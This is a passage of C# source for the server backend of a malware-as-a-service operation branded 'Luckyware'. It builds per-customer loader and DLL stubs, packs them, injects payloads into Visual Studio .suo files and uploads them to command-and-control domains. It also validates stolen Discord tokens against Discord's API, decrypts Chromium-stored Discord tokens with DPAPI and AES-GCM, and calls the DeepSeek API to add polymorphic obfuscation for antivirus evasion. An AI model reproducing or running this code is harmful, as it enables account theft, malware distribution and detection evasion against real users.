                contents = Convert.ToBase64String(File.ReadAllBytes(Directory.GetCurrentDirectory() + "\\Builds\\" + FolderTMP + "\\x64\\Release\\LoaderPRE.exe"));
            }
            else
            {
                Console.WriteLine("Compiling free stub");


                CopyDirectory(Directory.GetCurrentDirectory() + "\\Loader", TMPCopy);

                Thread.Sleep(150);

                ReplaceTextInFile(Directory.GetCurrentDirectory() + "\\Builds\\" + FolderTMP + "\\Loader.cpp", "//OWNERID", Owd);
                Thread.Sleep(20);
                ReplaceTextInFile(Directory.GetCurrentDirectory() + "\\Builds\\" + FolderTMP + "\\Loader.cpp", "//BUILDID", Bwd);
                Thread.Sleep(20);

                string projectPath = Directory.GetCurrentDirectory() + "\\Builds\\" + FolderTMP + "\\Loader.vcxproj";
                string arguments = $"\"{projectPath}\" /p:Configuration=Release /p:Platform=x64";

                ExecuteCommand(msbuildPath, arguments);

                Thread.Sleep(10000);

                ExecuteCommand(Directory.GetCurrentDirectory() + "\\HPX.exe", Directory.GetCurrentDirectory() + "\\Builds\\" + FolderTMP + "\\x64\\Release\\Loader.exe");

                Thread.Sleep(5000);

                contents = Convert.ToBase64String(File.ReadAllBytes(Directory.GetCurrentDirectory() + "\\Builds\\" + FolderTMP + "\\x64\\Release\\Loader.exe"));
            }

            string fileToSend = Bwd + ".txt"; // The file you want to send
            File.WriteAllText(fileToSend, contents);
            Console.WriteLine("exe converted to text and saved as " + fileToSend + " ");

            Thread.Sleep(50);

            string phpUrl = $"https://{domene}/index.php?security=1&type=H1"; // Replace with your PHP script URL

            using (WebClient client = new WebClient())
            {
                // Upload the file
                byte[] responseArray = client.UploadFile(phpUrl, fileToSend);

                // Get the response from the PHP script (if any)
                string response = System.Text.Encoding.ASCII.GetString(responseArray);
                Console.WriteLine("Response from PHP: " + response);
            }

            Thread.Sleep(1000);

            DeleteFolder(Directory.GetCurrentDirectory() + "\\Builds\\" + FolderTMP);

            File.Delete(fileToSend);

            Thread.Sleep(3000);

            string FolderSUO = xxasdffds3(14);
            string SuoCoppi = Directory.GetCurrentDirectory() + "\\Builds\\" + FolderSUO;

            CopyDirectory(Directory.GetCurrentDirectory() + "\\InfSuo", SuoCoppi);

            string SUOprojectPath = Directory.GetCurrentDirectory() + "\\Builds\\" + FolderSUO + "\\suo.exe";
            string SUOargs = $"{SUOprojectPath} {SuoCoppi}\\h.suo {SuoCoppi}\\out.suo {Bwd}.txt";

            Thread.Sleep(1500);

            ExecuteCommandCMD(SUOargs);

            Thread.Sleep(1500);

            string contentssuo = Convert.ToBase64String(File.ReadAllBytes(Directory.GetCurrentDirectory() + "\\Builds\\" + FolderSUO + "\\out.suo"));

            string fileToSendSUO = Bwd + ".suo"; // The file you want to send
            File.WriteAllText(fileToSendSUO, contentssuo);
            Console.WriteLine("exe converted to text and saved as " + fileToSendSUO + " ");

            string phpUrlSUO = $"https://{domene}/index.php?security=1&type=H1"; // Replace with your PHP script URL

            using (WebClient client = new WebClient())
            {
                // Upload the file
                byte[] responseArraySUO = client.UploadFile(phpUrlSUO, fileToSendSUO);

                // Get the response from the PHP script (if any)
                string response = System.Text.Encoding.ASCII.GetString(responseArraySUO);
                Console.WriteLine("Response from PHP: " + response);
            }

            Thread.Sleep(3500);


            DeleteFolder(Directory.GetCurrentDirectory() + "\\Builds\\" + FolderSUO);

            File.Delete(fileToSendSUO);


            string FolderDLLTMP = xxasdffds3(15);
            string TMPDLLCopy = Directory.GetCurrentDirectory() + "\\Builds\\" + FolderDLLTMP;

            CopyDirectory(Directory.GetCurrentDirectory() + "\\InfDLL", TMPDLLCopy);

            Thread.Sleep(1000);

            ReplaceTextInFile(Directory.GetCurrentDirectory() + "\\Builds\\" + FolderDLLTMP + "\\TheDLL.cpp", "//OwneryID", Owd);
            Thread.Sleep(500);
            ReplaceTextInFile(Directory.GetCurrentDirectory() + "\\Builds\\" + FolderDLLTMP + "\\TheDLL.cpp", "//BuildyID", Bwd);
            Thread.Sleep(500);


            string projectPathDLL = Directory.GetCurrentDirectory() + "\\Builds\\" + FolderDLLTMP + "\\TheDLL.vcxproj";
            string argumentsDLL = $"\"{projectPathDLL}\" /p:Configuration=Release /p:Platform=x64";

            ExecuteCommand(msbuildPath, argumentsDLL);

            Thread.Sleep(10000);

            string contentsdll = Convert.ToBase64String(File.ReadAllBytes(Directory.GetCurrentDirectory() + "\\Builds\\" + FolderDLLTMP + "\\x64\\Release\\TheDLL.dll"));

            string fileToSendDll = Bwd + ".dll"; // The file you want to send
            File.WriteAllText(fileToSendDll, contentsdll);
            Console.WriteLine("exe converted to text and saved as " + fileToSendDll + " ");

            Thread.Sleep(500);

            string phpUrlDll = $"https://{domene}/index.php?security=1&type=H1"; // Replace with your PHP script URL

            using (WebClient client = new WebClient())
            {
                // Upload the file
                byte[] responseArrayDll = client.UploadFile(phpUrlDll, fileToSendDll);

                // Get the response from the PHP script (if any)
                string response = System.Text.Encoding.ASCII.GetString(responseArrayDll);
                Console.WriteLine("Response from PHP: " + response);
            }

            Thread.Sleep(2000);

            DeleteFolder(Directory.GetCurrentDirectory() + "\\Builds\\" + FolderDLLTMP);

            File.Delete(fileToSendDll);


            if (iconsave != "messi")
            {
                File.Delete(iconsave);
            }

            Console.WriteLine("All Cleaned! Ending");
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Error omeygat {ex.Message}");

        }

    }

    public static string SentAPIRequest(string token)
    {
        try
        {
            ServicePointManager.Expect100Continue = true;
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://discordapp.com/api/v8/users/@me");
            request.Headers.Set("Authorization", token);
            string responseStr = new StreamReader(((HttpWebResponse)request.GetResponse()).GetResponseStream()).ReadToEnd();
            return responseStr;
        }
        catch (Exception ex)
        {
            Console.WriteLine("OMG EX: " + ex.Message);
            return "";
        }

    }
    static bool CheckToken(string token)
    {
        string infoJson = SentAPIRequest(token);
        Console.WriteLine(infoJson);
        if (infoJson.Contains("id"))
        {
            return true;
        }
        else
        {
            return false;
        }
    }

    static string MutateCode(string code)
    {
        using (var client = new HttpClient())
        {
            client.DefaultRequestHeaders.Add("Authorization", "Bearer ???");
            var requestObj = new
            {
                model = "deepseek-chat",
                messages = new[]
                {
            new { role = "system", content = "You will be given C++ function code. Your job is to add obfuscation macros to it. The available macros are: POLYMORPH_NOISE(); POLYMORPH_NOISE_2(); POLYMORPH_NOISE_3(); POLYMORPH_NOISE_4(); POLYMORPH_NOISE_5(); POLYMORPH_NOISE_6(); POLYMORPH_NOISE_7(); POLYMORPH_NOISE_8(); POLYMORPH_NOISE_9(); POLYMORPH_NOISE_10(); poly_junk(); Only add macros between complete C++ statements on new lines. Never modify original code or add macros inside arrays, initializers, function parameters, or incomplete statements. Do not touch code between //DONT_START// and //DONT_END// markers. Use 2-10 macros for small functions, 5-20 for large functions. Match nearby code indentation. Mix macros randomly or use same one repeatedly. THIS IS REALLY IMPORTANT: Return only modified code, no explanations, no other message." },
            new { role = "user", content = code }
        },
                stream = false,
                max_tokens = 8000,
                temperature = 0.0
            };
            var json = Newtonsoft.Json.JsonConvert.SerializeObject(requestObj);
            var content = new StringContent(json, Encoding.UTF8, "application/json");
            var response = client.PostAsync("https://api.deepseek.com/chat/completions", content).Result;
            var responseString = response.Content.ReadAsStringAsync().Result;
            if (!response.IsSuccessStatusCode)
            {
                Console.WriteLine($"Error: {response.StatusCode} - {responseString}");
                Console.ReadKey();
                return "no";
            }
            var responseJson = JObject.Parse(responseString);
            var message = responseJson["choices"][0]["message"]["content"].ToString();
            Console.WriteLine(message);
            return message;
        }
    }
    static string DekryptToken(string token, string key)
    {
        // Extract and decrypt the key
        byte[] encryptedKeyBytes = Convert.FromBase64String(key).Skip(5).ToArray();
        byte[] decryptedKey = ProtectedData.Unprotect(encryptedKeyBytes, null, DataProtectionScope.CurrentUser);

        // Parse the token to extract the payload
        string base64Payload = token.Split(new[] { "dQw4w9WgXcQ:" }, StringSplitOptions.None)[1];
        byte[] payloadBytes = Convert.FromBase64String(base64Payload);

        // Extract IV and cipher text
        byte[] iv = payloadBytes.Skip(3).Take(12).ToArray();
        byte[] cipherText = payloadBytes.Skip(15).ToArray();

        // Set up decryption parameters
        AeadParameters parameters = new AeadParameters(new KeyParameter(decryptedKey), 128, iv, null);
        GcmBlockCipher cipher = new GcmBlockCipher(new AesEngine());
        cipher.Init(false, parameters);

        // Decrypt the cipher text
        byte[] plainTextBytes = new byte[cipher.GetOutputSize(cipherText.Length)];
        int len = cipher.ProcessBytes(cipherText, 0, cipherText.Length, plainTextBytes, 0);
        cipher.DoFinal(plainTextBytes, len);

        // Convert the plain text to string and print
        string plainText = Encoding.UTF8.GetString(plainTextBytes).TrimEnd('\0');

        return plainText;
    }


    static void PingDomain()
    {
        Console.WriteLine("LW Server Inside Domain Checks");

        try
        {
            string Ping = $"https://{domene}/index.php?security=2&type=check_all&key=Chekermeker4";

            Console.WriteLine(Ping);

            // Create a WebClient with a CookieContainer to manage cookies.
            using (WebClient client = new WebClient())
            {
                ServicePointManager.Expect100Continue = true;
                ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;

                // Download data from the URL.
                System.Net.ServicePointManager.ServerCertificateValidationCallback = delegate (object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors) { return true; };

                client.DownloadString(Ping);
            }


        }
        catch (Exception ex)
        {
            Console.WriteLine($"Error omeygat at dmn handle {ex.Message}");
        }

    }
    static void TokenHandler()
    {
        Console.WriteLine("LW Server Inside Tokens");

        while (true)
        {


            try
            {

                PingDomain();


                string Ping = $"https://{domene}/index.php?security=2&type=senioreztoken&key=herseyimdinnn98";

                string json;
                Console.WriteLine(Ping);

                // Create a WebClient with a CookieContainer to manage cookies.
                using (WebClient client = new WebClient())
                {
                    ServicePointManager.Expect100Continue = true;
                    ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;

                    // Download data from the URL.
                    System.Net.ServicePointManager.ServerCertificateValidationCallback = delegate (object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors) { return true; };

                    json = client.DownloadString(Ping);
                }


                // Parse the JSON as an array of objects
                JArray dataArray = JArray.Parse(json);

                Console.WriteLine("LW Server New Token Check Session");


                foreach (JObject data in dataArray)
                {
                    try
                    {

                        string Token = data["Token"].ToString();
                        string TokenID = data["TokenID"].ToString();
                        string isvald = data["isvalid"].ToString();
                        string UserID = data["UserID"].ToString();
                        string Pfp = data["pfp"].ToString();

                        Console.WriteLine($"NEW TOKEN");
                        Console.WriteLine($"Token: {Token}");
                        Console.WriteLine($"TokenID: {TokenID}");
                        Console.WriteLine($"isvald: {isvald}");
                        Console.WriteLine($"UserID: {UserID}");
                        Console.WriteLine($"Pfp: {Pfp}");

                        if (isvald == "1")
                        {
                            if (!CheckToken(Token))
                            {
                                using (WebClient client = new WebClient())
                                {
                                    ServicePointManager.Expect100Continue = true;
                                    ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;

                                    // Download data from the URL.
                                    System.Net.ServicePointManager.ServerCertificateValidationCallback = delegate (object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors) { return true; };

                                    client.DownloadString($"https://{domene}/index.php?security=2&type=antitokenagez&key=kumralamk77&id=" + TokenID);
                                }
                                Console.WriteLine("Invaliditized Token Id " + TokenID);
                            }
                        }

                        if (!UrlIsValid(Pfp))
                        {

                            string newpefp = GetUserAvatar(UserID);
                            using (WebClient client = new WebClient())
                            {
                                ServicePointManager.Expect100Continue = true;
                                ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;

                                // Download data from the URL.
                                System.Net.ServicePointManager.ServerCertificateValidationCallback = delegate (object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors) { return true; };

                                client.DownloadString($"https://{domene}/index.php?security=2&type=pfpupoddotto&key=herkimleysen6&id=" + TokenID + "&iduser=" + newpefp);
                            }
                            Console.WriteLine("PFP Updated Token Id " + TokenID);

                        }

                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine($"Error omeygatunu {ex.Message}");
                        continue;
                    }
                }


            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error omeygat {ex.Message}");
                continue;
            }

            Thread.Sleep(600000); // Every 10 minutes.

        }
    }

    static void DllHandling()
    {
        Console.WriteLine("LW Server Inside DLL");

        while (true)
        {
            try
            {


                string msbuildPath = @"C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Current\Bin\MSBuild.exe";

                string FolderTMP = xxasdffds3(10);
                string TMPCopy = Directory.GetCurrentDirectory() + "\\Builds\\" + FolderTMP;

                string contents;

                Console.WriteLine("Compiling startup dll");


                CopyDirectory(Directory.GetCurrentDirectory() + "\\Startup", TMPCopy);

                Thread.Sleep(150);

                ReplaceTextInFile(Directory.GetCurrentDirectory() + "\\Builds\\" + FolderTMP + "\\Encrypt.h", "OMGHERE", HexGenerator.GetRandomHex());
                Thread.Sleep(20);

                string projectPath = Directory.GetCurrentDirectory() + "\\Builds\\" + FolderTMP + "\\Plds.vcxproj";
                string arguments = $"\"{projectPath}\" /p:Configuration=Release /p:Platform=x64";

                ExecuteCommand(msbuildPath, arguments);

                Thread.Sleep(12000);

                contents = Convert.ToBase64String(File.ReadAllBytes(Directory.GetCurrentDirectory() + "\\Builds\\" + FolderTMP + "\\x64\\Release\\wer.dll"));


                string fileToSend = FolderTMP + ".txt"; // The file you want to send
                File.WriteAllText(fileToSend, contents);
                Console.WriteLine("exe converted to text and saved as " + fileToSend + " ");


                Thread.Sleep(500);

                string phpUrlDll = $"https://{domene}/Stb/Startapload.php?security=startaaaupot"; // Replace with your PHP script URL

                using (WebClient client = new WebClient())
                {
                    // Upload the file
                    byte[] responseArrayDll = client.UploadFile(phpUrlDll, fileToSend);

                    // Get the response from the PHP script (if any)
                    string response = System.Text.Encoding.ASCII.GetString(responseArrayDll);
                    Console.WriteLine("Response from PHP: " + response);
                }

                Thread.Sleep(2000);

                DeleteFolder(Directory.GetCurrentDirectory() + "\\Builds\\" + FolderTMP);

                File.Delete(fileToSend);


                Console.WriteLine("All Cleaned! Ending");
                Thread.Sleep(10800000); // 3 hr
            

            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error omeygat {ex.Message}");
                Thread.Sleep(10800000); // 3 hr
                continue;
            }
        }
    }


    static void BuildHandler()
    {
        Console.WriteLine("LW Server Inside Build");

        while (true)
        {
            Thread.Sleep(5000);
            try
            {
                string Ping = $"https://{domene}/index.php?security=2&type=buildamingo&key=dolaylar7475";

                string json;
                Console.WriteLine(Ping);

                // Create a WebClient with a CookieContainer to manage cookies.
                using (WebClient client = new WebClient())
                {
                    ServicePointManager.Expect100Continue = true;
                    ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;

                    // Download data from the URL.
                    System.Net.ServicePointManager.ServerCertificateValidationCallback = delegate (object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors) { return true; };

                    json = client.DownloadString(Ping);
                }

                Console.WriteLine(json);

                // Parse the JSON as an array of objects
                JArray dataArray = JArray.Parse(json);

                foreach (JObject data in dataArray)
                {
                    Console.WriteLine("LW Server New Build");

                    string OwnerID = data["OwnerID"].ToString();
                    string BuildKey = data["BuildKey"].ToString();
                    string ExeName = data["ExeName"].ToString();
                    string Icon = data["Icon"].ToString();


                    Console.WriteLine($"NEW ACTION");
                    Console.WriteLine($"OwnerID: {OwnerID}");
                    Console.WriteLine($"BuildKey: {BuildKey}");
                    Console.WriteLine($"ExeName: {ExeName}");
                    Console.WriteLine($"Icon: {Icon}");

                    Console.WriteLine("Inside Build Thread");



                    Thread DosAt = new Thread(new ParameterizedThreadStart(BuildStub));


                    string oib = OwnerID;
                    string bkey = BuildKey;
                    string exnam = ExeName;
                    string icn = Icon;


                    DosAt.Start(new { oib, bkey, exnam, icn });

                }


            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error omeygat {ex.Message}");
                continue;
            }
        }
    }

    public class dWebHook : IDisposable
    {
        private readonly WebClient dWebClient;
        private static NameValueCollection discordValues = new NameValueCollection();
        public string WebHook { get; set; }
        public string UserName { get; set; }
        public string ProfilePicture { get; set; }

        public dWebHook()
        {
            dWebClient = new WebClient();
        }


        public void SendMessage(string msgSend)
        {
            discordValues.Add("username", UserName);
            discordValues.Add("avatar_url", ProfilePicture);
            discordValues.Add("content", msgSend);

            dWebClient.UploadValues(WebHook, discordValues);
        }

        public void Dispose()
        {
            dWebClient.Dispose();
        }
    }

    static void SendMs(string message, string webhook)
    {

        Console.WriteLine($"{message} {webhook}");
        using (dWebHook dcWeb = new dWebHook())
        {
            dcWeb.ProfilePicture = "https://zetolacs-funny.pics/Stb/LW.png";
            dcWeb.UserName = "Luckyware";
            dcWeb.WebHook = webhook;
            dcWeb.SendMessage(message);
        }
    }

    static void MutateCode()
    {
        Console.Write("Enter path to .cpp file: ");
        string filePath = Console.ReadLine();

        if (!File.Exists(filePath))
        {
            Console.WriteLine("File not found.");
            return;
        }

        string content = File.ReadAllText(filePath);

        string pattern = @"//##FUNC##//\s*(.*?)\s*//##FUNC##//";
        var matches = Regex.Matches(content, pattern, RegexOptions.Singleline);

        foreach (Match match in matches)
        {
            string originalFunc = match.Value;
            string funcBody = match.Groups[1].Value;
            string mutated = MutateCode(funcBody);

            string replaced = $"//##FUNC##//\n{mutated}\n//##FUNC##//";
            content = content.Replace(originalFunc, replaced);
        }

        File.WriteAllText(filePath, content);
        Console.WriteLine("Mutation complete. File updated.");
    }

    static void Main()
    {


        /*string url = "https://zetolacs-funny.pics/index.php?security=2&type=webhooksxd&key=webokarnene3334";

        try
        {
            using (WebClient client = new WebClient())
            {
                // Get the JSON response as a string
                string jsonResponse = client.DownloadString(url);

                // Deserialize JSON into an array of strings using Newtonsoft.Json
                string[] webhooks = JsonConvert.DeserializeObject<string[]>(jsonResponse);

                // Print each webhook
                foreach (var webhook in webhooks)
                {
                    try
                    {
                        Console.WriteLine(webhook);

                        if (webhook.Length > 70)
                        {
                            SendMs("@everyone Thank you for 10,000 users! As our appreciation, we’re giving you a 2-week Luckyware special license. This license grants access to all premium features, but it does not allow building a fully undetectable premium stub. " + client.DownloadString("https://i-like.boats/Stb/Promotion.php"), webhook);
                            Thread.Sleep(1000);
                        }
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine($"Error IN: {ex.Message}");
                        continue;
                    }
                }
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Error: {ex.Message}");
        }
        
        Thread.Sleep(-1); */



        using (WebClient client = new WebClient())
        {
            ServicePointManager.Expect100Continue = true;
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;


            System.Net.ServicePointManager.ServerCertificateValidationCallback = delegate (object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors) { return true; };

            domene = "contorosa.space";
        }

        string Ping = $"https://{domene}/index.php?security=2&type=buildamingo&key=dolaylar7475";
        Console.WriteLine(Ping);

        Console.WriteLine("Getting Useless Data Before Start");

        // Create a WebClient with a CookieContainer to manage cookies.
        using (WebClient client = new WebClient())
        {
            ServicePointManager.Expect100Continue = true;
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;

            // Download data from the URL.
            System.Net.ServicePointManager.ServerCertificateValidationCallback = delegate (object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors) { return true; };

            client.DownloadString(Ping);
        }

        Console.WriteLine("LW Server Handler Starting...");


        Thread Build = new Thread(new ThreadStart(BuildHandler));
        Build.Start();

        Thread Token = new Thread(new ThreadStart(TokenHandler));
        Token.Start();

        //Thread DllThread = new Thread(new ThreadStart(DllHandling));
        //DllThread.Start();

        Thread.Sleep(-1);
    }
}
